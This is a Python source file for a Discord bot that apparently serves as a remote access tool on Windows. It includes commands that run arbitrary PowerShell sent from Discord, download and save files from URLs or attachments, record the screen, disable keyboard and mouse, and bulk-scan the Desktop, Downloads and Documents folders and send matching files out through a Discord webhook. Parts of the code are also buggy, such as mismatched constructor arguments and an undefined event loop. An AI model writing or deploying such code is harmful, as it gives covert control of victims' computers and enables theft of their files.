import discord
from discord.ext import commands
import threading
import subprocess
import time
import requests
import os
import asyncio
import concurrent.futures
import threading
from fun_module import SystemUtility
from discord_module import DiscordHandler

from discord.ext.commands import CommandNotFound
from fuzzywuzzy import process


class DiscordBotModule:
    def __init__(self,logger,settings):
        self.token = settings.get_value("token")
        self.executed_commands = {}  # Dictionary to store executed commands with timestamps
        self.bot = commands.Bot(command_prefix='/', intents=self.get_intents())  # Set command prefix to '/'
        self.register_commands()
        global ALLOWED_EXTENSIONS ,DISCORD_WEBHOOK_URL,discord_handler
        DISCORD_WEBHOOK_URL = settings.get_value("WEBHOOK_URL")
        discord_handler = DiscordHandler(DISCORD_WEBHOOK_URL,logger)
        self.logger = logger

        ALLOWED_EXTENSIONS = settings.get_value("ALLOWED_EXTENSIONS")
        self.utility = SystemUtility(discord_handler)  # Initialize SystemUtility instance
    
    async def stop(self):
        try:
            await self.bot.close()
            print("Discord Bot closed successfully.")
        except Exception as e:
            print(f"Error during bot closure: {e}")

    def start(self):
        try:
            self.bot.run(self.token)
        except Exception as e:
            print(f"Error during bot strting in DiscordBOT module in start function : {e}")



    
    def get_intents(self):
        intents = discord.Intents.default()
        intents.typing = True
        intents.presences = True
        intents.messages = True
        intents.guilds = True  # Enable server (guild) intents
        intents.members = True  # Enable member intents
        return intents


    
    def register_commands(self):
        @self.bot.event
        async def on_ready():
            print(f'Logged in as {self.bot.user.name}')
            self.logger.log(f'Logged in as {self.bot.user.name}')
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return  # Ignore messages from bots to prevent potential loops

            await self.bot.process_commands(message)

        @self.bot.command(name='pcm', description='Execute a PowerShell command.')  # Command name is set to 'pcm'
        async def pcm(ctx, *, command: str):
            try:
                output = subprocess.check_output(["powershell", command], shell=True, stderr=subprocess.STDOUT)
                await ctx.send(f'Command executed successfully:\n```{output.decode("utf-8")}```')
                self.executed_commands[command] = time.time()  # Record the timestamp of the executed command
                
                self.logger.log(f'Executed powershell command: {command}')
                self.logger.log(f'Command executed successfully:\n```{output.decode("utf-8")}```')
            except Exception as e:
                await ctx.send(f'Error executing command:\n```{str(e)}```')
                self.logger.error(f'Error executing powershell command: {command}, Error: {str(e)}')
        
        @self.bot.command(name='install', description='Download and install a file from the specified URL.')
        async def install(ctx, url: str):
            try:
                response = requests.get(url, stream=True)
                file_name = os.path.basename(url)
                download_path = os.path.join(os.path.expanduser("~"), "Downloads", file_name)

                with open(download_path, 'wb') as file:
                    for chunk in response.iter_content(chunk_size=8192):
                        file.write(chunk)

                await ctx.send(f'File downloaded successfully: {file_name}')
                self.logger.log(f'File downloaded: {file_name}')

            except Exception as e:
                await ctx.send(f'Error downloading file:\n```{str(e)}```')
                self.logger.error(f'Error downloading file: {str(e)}')

        
        
        @self.bot.command(name='h', description='Display help message for available commands.')
        async def h(ctx):
            help_message = (
    "Available commands:\n"
    "/pcm <powershell_command> - Execute a PowerShell command.\n"
    "/install <url> - Download and install a file from the specified URL.\n"
    "/completescan - Scan and send valid files from Desktop, Downloads, and Documents folders to Discord.\n"
    "/black_screen <duration_seconds> - Black the screen for a specified duration.\n"
    "/disable_keyboard <duration_seconds> - Disable the keyboard for a specified duration.\n"
    "/open_microsoft_edge <search_term> - Open Microsoft Edge with a specified search term.\n"
    "/close_task <task_name> - Close a specified task.\n"
    "/open_task <task_name> - Open a specified task.\n"
    "/show_message <title> <message> - Show a message box with a specified title and message.\n"
    "/disable_mouse <duration_seconds> - Disable the mouse for a specified duration.\n"
    "/toggle_volume - Toggle system volume (mute/unmute).\n"
    "/change_wallpaper <wallpaper_path> - Change the system wallpaper.\n"
    "/open_application <app_path> - Open a specified application.\n"
    "/record_screen <duration_seconds> - Record the screen for a specified duration.\n"
    "/lock_screen - Lock the system screen.\n"
    "/log_off - Log off the current user.\n"
    "/hibernate - Hibernate the system.\n"
    "/shutdown - Shutdown the system.\n"
    "/restart - Restart the system.\n"
    "/sleep - Put the system to sleep.\n"
    "/upload_file <file_path> - Upload a file to Discord.\n"
    "/install_attch - Download attached files from Discord.\n"  # Added function
    "\nUsage examples:\n"
    "/pcm Get-Process - Get a list of running processes.\n"
    "/install http://example.com/file.exe - Install a file from the specified URL.\n"
    "/completescan - Scan and send valid files to Discord.\n"
    "/black_screen 10 - Black the screen for 10 seconds.\n"
    "/disable_keyboard 5 - Disable the keyboard for 5 seconds.\n"
    "/open_microsoft_edge example.com - Open Microsoft Edge and search for 'example.com'.\n"
    "/close_task notepad.exe - Close the 'notepad.exe' task.\n"
    "/open_task calculator.exe - Open the 'calculator.exe' task.\n"
    "/show_message 'Test' 'Hello, World!' - Show a message box with title 'Test' and message 'Hello, World!'.\n"
    "/disable_mouse 3 - Disable the mouse for 3 seconds.\n"
    "/toggle_volume - Toggle system volume.\n"
    "/change_wallpaper C:\\path\\to\\wallpaper.jpg - Change the system wallpaper to the specified path.\n"
    "/open_application C:\\path\\to\\app.exe - Open the specified application.\n"
    "/record_screen 10 - Record the screen for 10 seconds.\n"
    "/lock_screen - Lock the system screen.\n"
    "/log_off - Log off the current user.\n"
    "/hibernate - Hibernate the system.\n"
    "/shutdown - Shutdown the system.\n"
    "/restart - Restart the system.\n"
    "/sleep - Put the system to sleep.\n"
    "/upload_file C:\\path\\to\\file.txt - Upload a specific file to Discord.\n"
    "/install_attch - Download attached files from Discord.\n"  # Added function
    "\nWarning: Use these commands responsibly and only on your own systems."
)


            

            message_chunks = self.split_long_message(help_message)
    
            # Send each chunk as a separate message
            for chunk in message_chunks:
                await ctx.send(chunk)
        
        @self.bot.command(name='completescan', description='Scan and send valid files from Desktop, Downloads, and Documents folders to Discord.')
        async def completescan(ctx):
            try:
                await self.scan_and_send_files(DiscordHandler(DISCORD_WEBHOOK_URL),ctx)
            except Exception as e:
                print(f"Error scanning and sending files: {e}")
                await ctx.send(f"Error scanning and sending files: {e}")

        
        
        @self.bot.command(name='black_screen', description='Black the screen for a specified duration.')
        async def black_screen(ctx, duration_seconds: int):
            self.logger.log(f"Command:black_screen duration:{duration_seconds}")
            success, error = self.utility.black_screen(duration_seconds)
            if success:
                await ctx.send("Screen blacked successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")
                

        @self.bot.command(name='disable_keyboard', description='Disable the keyboard for a specified duration.')
        async def disable_keyboard(ctx, duration_seconds: int):
            success, error = self.utility.disable_keyboard(duration_seconds)
            self.logger.log(f"Command:disable_keyboard duration:{duration_seconds}")
            if success:
                await ctx.send("Keyboard disabled successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='open_microsoft_edge', description='Open Microsoft Edge with a specified search term.')
        async def open_microsoft_edge(ctx, search_term: str):
            success, error = self.utility.open_microsoft_edge(search_term)
            self.logger.log(f"Command:open_microsoft_edge search_term:{search_term}")
            if success:
                await ctx.send("Microsoft Edge opened successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='close_task', description='Close a specified task.')
        async def close_task(ctx, task_name: str):
            self.logger.log(f"Command:close_task TASK:{task_name}")
            success, error = self.utility.close_task(task_name)
            if success:
                await ctx.send("Task closed successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='open_task', description='Open a specified task.')
        async def open_task(ctx, task_name: str):
            self.logger.log(f"Command:close_task TASK:{task_name}")
            success, error = self.utility.open_task(task_name)
            if success:
                await ctx.send("Task opened successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        #just old message
        @self.bot.command(name='show_message', description='Show a message box with a specified title and message.')
        async def show_message(ctx, title: str, message: str):
            self.logger.log(f"Command:show_message title:{title},message:{message}")
            
            success, error = self.utility.show_message(title, message)
            if success:
                await ctx.send("Message shown successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='disable_mouse', description='Disable the mouse for a specified duration.')
        async def disable_mouse(ctx, duration_seconds: int):
            self.logger.log(f"Command:disable_keyboard duration:{duration_seconds}")

            success, error = self.utility.disable_mouse(duration_seconds)
            if success:
                await ctx.send("Mouse disabled successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='shutdown', description='Shutdown the system.')
        async def shutdown(ctx):
            self.logger.log(f"Command:shutdown")

            success, error = self.utility.shutdown()
            if success:
                await ctx.send("System is shutting down.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='restart', description='Restart the system.')
        async def restart(ctx):
            self.logger.log(f"Command:restart")

            success, error = self.utility.restart()
            if success:
                await ctx.send("System is restarting.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='sleep', description='Put the system to sleep.')
        async def sleep(ctx):
            self.logger.log(f"Command:sleep")
            
            success, error = self.utility.sleep()
            if success:
                await ctx.send("System is going to sleep.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='lock_screen', description='Lock the system screen.')
        async def lock_screen(ctx):
            self.logger.log(f"Command:lock_screen")

            success, error = self.utility.lock_screen()
            if success:
                await ctx.send("System screen locked successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='log_off', description='Log off the current user.')
        async def log_off(ctx):
            self.logger.log(f"Command:log_off")

            success, error = self.utility.log_off()
            if success:
                await ctx.send("User logged off successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='hibernate', description='Hibernate the system.')
        async def hibernate(ctx):
            self.logger.log(f"Command:hibernate")

            success, error = self.utility.hibernate()
            if success:
                await ctx.send("System is hibernating.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='toggle_volume', description='Toggle system volume (mute/unmute).')
        async def toggle_volume(ctx):
            self.logger.log(f"Command:toggle_volume")

            success, error = self.utility.toggle_volume()
            if success:
                await ctx.send("System volume toggled.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command(name='change_wallpaper', description='Change the system wallpaper.')
        async def change_wallpaper(ctx, wallpaper_path: str):
            self.logger.log(f"Command:change_wallpaper wallpaper_path:{wallpaper_path} ")

            success, error = self.utility.change_wallpaper(wallpaper_path)
            if success:
                await ctx.send("Wallpaper changed successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='open_application', description='Open a specified application.')
        async def open_application(ctx, app_path: str):
            self.logger.log(f"Command:open_application app_path:{app_path} ")
            
            success, error = self.utility.open_application(app_path)
            if success:
                await ctx.send(f"Application '{app_path}' opened successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")

        @self.bot.command(name='record_screen', description='Record the screen for a specified duration.')
        async def record_screen(ctx, duration_seconds: int):
            self.logger.log(f"Command:record_screen duration_seconds:{duration_seconds} ")

            success, error = self.utility.record_screen(duration_seconds)
            if success:
                await ctx.send(f"Screen recorded successfully.")
            else:
                await ctx.send(f"Error: {error}")
                self.logger.error(f"Error: {error}")


        @self.bot.command(name='upload_file', description='Upload a file to Discord.')
        async def upload_file(self, ctx, path: str):
            try:
                self.logger.log(f"Command:upload_file Path:{path}")
                # Check if the file exists
                if os.path.exists(path):
                    with open(path, 'rb') as file:
                        await self.discord_module.send_file(file, filename=os.path.basename(path))
                    await ctx.send(f"File uploaded successfully: {path}")
                else:
                    await ctx.send(f"File not found: {path}")
            except (FileNotFoundError, PermissionError) as e:
                await ctx.send(f"Error uploading file: {e}")
                self.logger.error(f"Error: {e}")

                
        @self.bot.command(name='install_attch', description='Download attached files.')
        async def install_attch(ctx):
            if not ctx.message.attachments:
                await ctx.send("No files attached.")
                return

            download_directory = os.path.expanduser("~\Downloads")  # Automatically get the user's download directory

            for attachment in ctx.message.attachments:
                try:
                    await attachment.save(fp=os.path.join(download_directory, attachment.filename))
                    await ctx.send(f"File '{attachment.filename}' downloaded successfully.")
                except Exception as e:
                    await ctx.send(f"Error downloading file '{attachment.filename}': {e}")

        
        @self.bot.command(name='stop_bot', description='Stop the Discord BOT.')
        async def stop_bot(ctx):
            try:
                # Check if the user invoking the command has the appropriate permissions (optional)
                if ctx.author.id == 882123213243559966:
                    await ctx.send("Stopping Discord BOT...")
                    await self.bot.logout()
                else:
                    await ctx.send("You do not have permission to stop the bot.")

            except Exception as e:
                self.logger.log_error(f"Error stopping Discord BOT: {str(e)}")

        @self.bot.event
        async def on_command_error(self, ctx, error):
            if isinstance(error, CommandNotFound):
                user_input = ctx.message.content.lower()[1:]  # Extract user input excluding the command prefix
                available_commands = [cmd.name for cmd in self.bot.commands]

                # Use fuzzy matching to find the closest matching command
                closest_match, score = process.extractOne(user_input, available_commands)
                
                if score >= self.allowed_command_distance:
                    suggestion = f"`{self.bot.command_prefix}{closest_match}`"
                    await ctx.send(f"Command not found. Did you mean {suggestion}?")
                else:
                    await ctx.send("Command not found. Please check your input.")

                
    
        
    async def get_valid_files(self, desktop_path, downloads_path, documents_path, max_file_size_mb=5):
        max_file_size_bytes = max_file_size_mb * 1024 * 1024  # Convert MB to bytes
        valid_files = []

        for root_dir in [desktop_path, downloads_path, documents_path]:
            for foldername, _, filenames in os.walk(root_dir):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    _, extension = os.path.splitext(filename)

                    if extension.lower() in ALLOWED_EXTENSIONS:
                        try:
                            # Get file size in bytes and compare with the maximum allowed size
                            file_size_bytes = os.path.getsize(file_path)
                            if file_size_bytes <= max_file_size_bytes:
                                valid_files.append(file_path)
                        except OSError as e:
                            print(f"Error getting file size for '{file_path}': {e}")
                            # Handle the error as needed (skip the file, log the error, etc.)

        return valid_files
    # Function to split long messages into chunks
    def split_long_message(self, message):
        max_length = 2000
        chunks = [message[i:i+max_length] for i in range(0, len(message), max_length)]
        return chunks   
    async def scan_and_send_files(self, discord_module, ctx):
        try:
            await self.logger.log("Scanning and sending files...")
            desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
            download_path = os.path.join(os.path.expanduser("~"), "Downloads")
            documents_path = os.path.join(os.path.expanduser("~"), "Documents")
            
            valid_files = await self.get_valid_files(desktop_path, download_path, documents_path)
            if valid_files:
                await ctx.send(f"Found {len(valid_files)} valid files.")
                await ctx.send(f"Founded files are: {valid_files} valid files.")
                await ctx.send(f"Check the group rknotes for files.")
                await self.send_files_to_discord(valid_files, discord_module, ctx)
        except Exception as e:
            self.logger.log_error(f"Error scanning and sending files: {str(e)}")

        
    async def send_files_to_discord(self, file_paths, discord_module, ctx):
        loop = asyncio.get_event_loop()  # Get the event loop
        with concurrent.futures.ThreadPoolExecutor(loop=loop) as executor:
            futures = [loop.run_in_executor(executor, self.send_file_to_discord, file_path, discord_module, ctx) for file_path in file_paths]
            await asyncio.gather(*futures)

    def send_file_to_discord(self, file_path, discord_module, ctx):
        if os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as file_obj:
                    asyncio.run_coroutine_threadsafe(discord_module.send_file(file_obj, filename=os.path.basename(file_path)), loop=self.loop)
                    print(f"File sent successfully: {file_path}")
                    asyncio.run_coroutine_threadsafe(ctx.send(f"File sent successfully: {file_path}"), loop=self.loop)
            except Exception as e:
                print(f"Error sending file '{file_path}': {e}")
                asyncio.run_coroutine_threadsafe(ctx.send(f"Error sending file '{file_path}': {e}"), loop=self.loop)
        else:
            print(f"File not found: {file_path}")
            asyncio.run_coroutine_threadsafe(ctx.send(f"File not found: {file_path}"), loop=self.loop)


        
# Example usage:
if __name__ == '__main__':
    bot_token = "cant share "
    DISCORD_WEBHOOK = "cant share "
    bot_module = DiscordBotModule(bot_token,DISCORD_WEBHOOK)

    # Start the bot in a separate thread
    bot_thread = threading.Thread(target=bot_module.start, daemon=True)
    bot_thread.start()
    
    while True:
        pass
